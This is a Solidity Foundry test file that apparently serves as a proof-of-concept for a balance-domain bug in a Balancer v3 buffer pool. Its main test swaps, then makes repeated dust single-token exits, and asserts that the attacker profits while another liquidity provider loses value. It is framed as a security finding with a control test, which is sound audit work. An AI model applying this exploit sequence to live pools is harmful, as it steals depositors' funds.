// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IStandardExchangeBufferPool} from
    "contracts/protocols/dexes/balancer/v3/pools/constProd/standardExchange/IStandardExchangeBufferPool.sol";
import {TestBase_StandardExchangeBufferPool} from
    "test/foundry/spec/protocols/dexes/balancer/v3/pools/constProd/standardExchange/bases/TestBase_StandardExchangeBufferPool.sol";

/// @notice PoC: StandardExchangeBufferPool.computeBalance returns math-domain balance
///         (live - lift(h)) while BasePoolMath subtracts it from the LIVE balance.
///         A dust-BPT SINGLE_TOKEN_EXACT_IN exit to the shares token pays ~lift(h).
contract BufferComputeBalanceDomainPoC is TestBase_StandardExchangeBufferPool {
    IStandardExchangeBufferPool internal p;
    address internal attacker;

    function setUp() public override {
        super.setUp();
        p = IStandardExchangeBufferPool(bufferPool);
        attacker = bob;
    }

    function _rate() internal view returns (uint256) {
        return seRateProvider.getRate();
    }

    /// value in TTA units: tta + shares * rate
    function _value(address who) internal view returns (uint256) {
        return tta.balanceOf(who) + shares.balanceOf(who) * _rate() / 1e18;
    }

    function _liveShares() internal view returns (uint256) {
        return shares.balanceOf(address(bv3Vault)) > 0 ? _poolBal(p.sharesIndex()) : 0;
    }

    function _poolBal(uint256 idx) internal view returns (uint256) {
        (,, uint256[] memory raw,) = bv3Vault.getPoolTokenInfo(bufferPool);
        return raw[idx];
    }

    /// Value of alice's whole BPT position if redeemed proportionally now (snapshot + revert).
    function _aliceProportionalValue() internal returns (uint256 v) {
        uint256 snap = vm.snapshotState();
        uint256 bal = IERC20(bufferPool).balanceOf(alice);
        uint256 before = _value(alice);
        removeLiquidityProportional(alice, bal, 0, 0);
        v = _value(alice) - before;
        vm.revertToState(snap);
    }

    function _exitSharesSingle(uint256 bptIn) internal returns (uint256 out) {
        vm.startPrank(attacker);
        out = router.removeLiquiditySingleTokenExactIn(bufferPool, bptIn, shares, 1, false, bytes(""));
        vm.stopPrank();
    }

    function _logState(string memory tag) internal view {
        console2.log(tag);
        console2.log("  hookSharesDelta", p.hookSharesDelta());
        console2.log("  virtualTTA     ", p.virtualTTA());
        console2.log("  pool raw shares", _poolBal(p.sharesIndex()));
        console2.log("  pool raw tta   ", _poolBal(p.ttaIndex()));
        console2.log("  BPT supply     ", bv3Vault.totalSupply(bufferPool));
    }

    function test_dustSingleTokenExit_drainsLiftH() public {
        uint256 X = 100e18; // TTA swapped in (~10% of 1000e18 pool depth)

        // ---- attacker capital (counted as cost) ----
        uint256 bptSharesIn = mintShares(attacker, 1e18); // tiny shares to obtain BPT
        mintTTA(attacker, X);
        vm.prank(attacker);
        IERC20(bufferPool).approve(address(router), type(uint256).max);

        uint256 aliceBefore = _aliceProportionalValue();
        uint256 attackerV0 = _value(attacker);
        rate0 = _rate();
        tta0 = tta.balanceOf(attacker);
        sh0 = shares.balanceOf(attacker);
        console2.log("rate", _rate());
        console2.log("attacker start value (TTA units)", attackerV0);
        console2.log("alice proportional value before", aliceBefore);
        _logState("initial");

        // ---- attack ----
        uint256 bpt = addLiquidityUnbalanced(attacker, 0, bptSharesIn);
        console2.log("attacker BPT", bpt);
        uint256 sharesOut = swapTTAforShares(attacker, X);
        console2.log("swap X TTA -> shares out", sharesOut);
        _logState("after swap");
        assertGt(p.hookSharesDelta(), 0, "h>0");

        uint256 chunk = bpt / 20;
        uint256 total;
        for (uint256 i = 0; i < 20; i++) {
            uint256 out;
            try this.exitExt(chunk) returns (uint256 o) { out = o; } catch { console2.log("exit reverted at", i); break; }
            total += out;
            console2.log("exit", i, out);
        }
        _logState("after exits");
        // exit whatever BPT remains proportionally
        uint256 rem = IERC20(bufferPool).balanceOf(attacker);
        if (rem > 0) removeLiquidityProportional(attacker, rem, 0, 0);

        uint256 attackerV1 = _value(attacker);
        _checkFairProfit();
        uint256 aliceAfter = _aliceProportionalValue();
        console2.log("total shares from dust exits", total);
        console2.log("attacker end value", attackerV1);
        console2.log("attacker PROFIT (TTA units)", int256(attackerV1) - int256(attackerV0));
        console2.log("alice proportional value after", aliceAfter);
        console2.log("alice LOSS (TTA units)", int256(aliceBefore) - int256(aliceAfter));

        assertGt(attackerV1, attackerV0, "attacker profit");
        assertLt(aliceAfter, aliceBefore, "victim loss");
    }

    uint256 internal rate0;
    uint256 internal tta0;
    uint256 internal sh0;

    function _checkFairProfit() internal {
        // Reviewer hardening: value deltas explicitly at the PRE-attack (fair) rate, check rate is not moved.
        uint256 rate1 = _rate();
        console2.log("rate before / after", rate0, rate1);
        int256 dTta = int256(tta.balanceOf(attacker)) - int256(tta0);
        int256 dSh = int256(shares.balanceOf(attacker)) - int256(sh0);
        console2.log("attacker dTTA", dTta);
        console2.log("attacker dShares", dSh);
        int256 profitAtRate0 = dTta + dSh * int256(rate0) / 1e18;
        console2.log("attacker PROFIT at pre-attack rate (TTA units)", profitAtRate0);
        assertEq(IERC20(bufferPool).balanceOf(attacker), 0, "attacker holds no residual BPT");
        assertGt(profitAtRate0, 0, "profit at fair pre-attack rate");
    }

    function exitExt(uint256 bptIn) external returns (uint256) {
        require(msg.sender == address(this));
        return _exitSharesSingle(bptIn);
    }

    /// Control: same dust exit with h == 0 pays ~proportional only.
    function test_control_noSwap() public {
        uint256 bptSharesIn = mintShares(attacker, 1e18);
        vm.prank(attacker);
        IERC20(bufferPool).approve(address(router), type(uint256).max);
        uint256 bpt = addLiquidityUnbalanced(attacker, 0, bptSharesIn);
        uint256 v0 = shares.balanceOf(attacker);
        uint256 out = _exitSharesSingle(bpt / 20);
        console2.log("control h", p.hookSharesDelta());
        console2.log("control exit out (shares) for bpt/20", out, "of shares in", bptSharesIn);
        assertEq(v0, 0);
        // honest dust exit with h == 0 is ~proportional: ~bptSharesIn/20 shares (within 10%)
        assertApproxEqRel(out, bptSharesIn / 20, 0.1e18, "control proportional");
    }
}
